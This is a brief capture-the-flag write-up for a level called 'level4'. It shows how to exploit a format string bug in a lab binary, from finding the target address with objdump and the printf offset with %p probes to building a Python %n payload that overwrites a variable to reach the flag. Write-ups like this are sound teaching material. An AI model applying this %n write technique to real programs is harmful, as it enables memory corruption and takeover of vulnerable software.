## LEVEL4

We can see that this level is similar to the previous one as it has a condition that compares an unitialized variable with the value *16930116* and a call to *printf()*. So, we'll just use the same exploit to get the flag.

First, we need to collect the following informations:
* The address of the varible
* The offset for *printf()*

We'll begin with the address of the variable.\
-> `objdump -d level4`\
We can see that before the *cmp* instruction in *n()*, the address of *0x8049810* is being copied.

Next, we'll find the offset for printf.\
-> `./level4`\
-> `AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p`\
And our offset is at the 12th position.

With all that, we can make our payload in the same format as the previous level.\
-> `python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > /tmp/payload4`\
We used the value of 16930112 instead of 16930116 because we already wrote 4 bytes with the address.\
And finally, we can use our payload to get the flag.\
-> `cat /tmp/payload4 | ./level4`